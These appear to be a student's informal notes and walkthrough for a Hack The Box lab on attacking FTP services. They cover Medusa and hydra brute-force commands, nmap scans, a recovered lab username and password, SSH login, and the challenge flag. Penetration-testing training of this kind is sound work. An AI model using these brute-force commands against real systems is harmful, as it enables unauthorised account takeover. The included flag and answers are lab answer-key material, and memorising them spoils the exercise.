Seeign as we jsut did most of these in the footprinting section i jsut wanted to get right back after them while everything is pretty fresh on my mind so if there arent as many notes in these sections thats why.

Misconfigs usually have to deal with anonymous log ons.

Brute Forcing
If there is no anonymous authentication available, we can also brute-force the login for the FTP services using a list of the pre-generated usernames and passwords. 
There are many different tools to perform a brute-forcing attack. Let us explore one of them, Medusa. 
With Medusa, we can use the option -u to specify a single user to target, or you can use the option -U to provide a file with a list of usernames.
The option -P is for a file containing a list of passwords. We can use the option -M and the protocol we are targeting (FTP) and the option -h for the target hostname or IP address.

Note: Although we may find services vulnerable to brute force, most applications today prevent these types of attacks. A more effective method is Password Spraying.

Syntax: MJBUCKNER@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp

okay lets just hop into the challege - 

Question 1 - What port is the FTP service running on? - 2121
1) sudo nmap -sCV -A 10.129.20.117
2) sudo nmap -sCV -A -p- 10.129.20.117
3) after resetting box THREE times... it finally came up as port 2121

Question 2 - What username is available for the FTP server? - robin 
1) connect to FTP port via anonymous -> ftp 10.129.15.107 -p 2121 
2) grab the user.list and password.list from ftp
3) hydra -L users.list -P passwords.list ftp://10.129.15.107:2121 -> remember if we are using a list and not an actual user or pass to set the flags to -L and -P not -l and -p 
4) [2121][ftp] host: 10.129.15.107   login: robin   password: 7iz4rnckjsduza7 -> username is robin 
 
Question 3 - Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer. - HTB{ATT4CK1NG_F7P_53RV1C3} 
1) ssh robin@10.129.15.107
2) ls 
3) cat flag.txt - HTB{ATT4CK1NG_F7P_53RV1C3}
